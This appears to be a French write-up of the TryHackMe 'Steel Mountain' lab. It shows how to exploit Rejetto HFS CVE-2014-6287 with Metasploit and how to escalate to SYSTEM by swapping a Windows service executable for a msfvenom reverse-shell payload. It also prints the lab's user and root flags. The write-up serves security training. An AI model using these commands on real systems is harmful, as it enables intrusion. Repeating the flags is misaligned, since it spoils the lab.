# TryHackMe: Steel Mountain

**Objectif :** exploiter Rejetto HFS pour obtenir un shell initial sur la machine Windows, retrouver le `user.txt`, identifier un service vulnerable cote systeme, puis obtenir un shell SYSTEM pour lire le `root.txt`.

---

## Introduction

La room **Steel Mountain** suit une logique tres propre :

1. enumeration des services
2. identification d'un second serveur web sur `8080`
3. RCE sur Rejetto HFS
4. enumeration Windows avec PowerUp
5. exploitation d'un service mal protege

Le vrai apprentissage vient de la transition entre un foothold web et une exploitation systeme Windows.

---

## Task 1: Introduction

### Question 1: Who is the employee of the month?

Le site web sur le port 80 affiche un portrait de l'employe du mois. En inspectant la page ou simplement le nom de l'image, on retrouve :

```text
Bill Harper
```

### Reponse

**Employee of the month:** `Bill Harper`

---

## Task 2: Initial Access

### Question 1: What is the other port running a web server on?

Je lance un scan :

```bash
nmap -Pn -sC -sV <IP>
```

Parmi les ports ouverts, un second service HTTP apparait sur :

```text
8080
```

### Reponse

**Other web server port:** `8080`

### Question 2: What file server is running?

En ouvrant `http://<IP>:8080`, la page affiche :

```text
HttpFileServer 2.3
```

Le vendeur lie ce service a :

```text
Rejetto HTTP File Server
```

### Reponse

**File server:** `Rejetto HTTP File Server`

### Question 3: What is the CVE number to exploit this file server?

Une recherche `searchsploit rejetto` ou une recherche web sur HFS 2.3 renvoie :

```text
CVE-2014-6287
```

### Reponse

**CVE:** `2014-6287`

### Question 4: Use Metasploit to get an initial shell. What is the user flag?

Je charge le module :

```text
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP>
set RPORT 8080
set LHOST <MON_IP_THM>
run
```

Une fois le shell ou la session Meterpreter ouverte, je me rends dans le bureau de Bill :

```text
cd C:\Users\Bill\Desktop
type user.txt
```

Le flag utilisateur est :

```text
b04763b6fcf51fcd7c13abc7db4fd365
```

### Reponse

**User flag:** `b04763b6fcf51fcd7c13abc7db4fd365`

---

## Task 3: Privilege Escalation

### Question 1: What is the name of the service which shows up as an unquoted service path vulnerability?

La room s'appuie en general sur `PowerUp.ps1` pour l'enumeration locale.

Je charge le module PowerShell dans Meterpreter puis j'importe PowerUp :

```text
load powershell
powershell_shell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

Le service qui ressort avec `CanRestart = True` et un chemin exploitable est :

```text
AdvancedSystemCareService9
```

### Reponse

**Vulnerable service name:** `AdvancedSystemCareService9`

### Question 2: What is the root flag?

La voie la plus stable ici consiste a remplacer l'executable du service par une charge utile Windows.

Je genere une charge :

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<MON_IP_THM> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Je l'upload sur la machine, puis je stoppe le service et je remplace le binaire legitime :

```text
sc stop AdvancedSystemCareService9
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
sc start AdvancedSystemCareService9
```

Avec un listener Netcat ou Metasploit en attente sur `4443`, j'obtiens un shell `NT AUTHORITY\SYSTEM`.

Je lis alors le flag root :

```text
type C:\Users\Administrator\Desktop\root.txt
```

Valeur :

```text
9af5f314f57607c00fd09803a587db80
```

### Reponse

**Root flag:** `9af5f314f57607c00fd09803a587db80`

---

## Task 4: Access and Escalation Without Metasploit

### Question 1: What powershell -c command could we run to manually find out the service name?

La commande demandee pour enumerer les services est :

```text
powershell -c "Get-Service"
```

### Reponse

**PowerShell command:** `powershell -c "Get-Service"`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| Employee of the month | `Bill Harper` |
| Other port running a web server | `8080` |
| File server running | `Rejetto HTTP File Server` |
| CVE number | `2014-6287` |
| User flag | `b04763b6fcf51fcd7c13abc7db4fd365` |
| Vulnerable service name | `AdvancedSystemCareService9` |
| Root flag | `9af5f314f57607c00fd09803a587db80` |
| PowerShell enumeration command | `powershell -c "Get-Service"` |

---

## Points cles a retenir

- Toujours regarder les **deux** serveurs web lorsqu'un scan en expose plusieurs.
- `PowerUp` reste un excellent outil d'aide a la privilege escalation Windows.
- La room parle d'un **unquoted service path**, mais beaucoup de writeups resolvent surtout l'exploitation via le **remplacement de l'executable** grace a des droits d'ecriture et a la possibilite de restart le service.

---

**Auteur :** Saad Idrissi
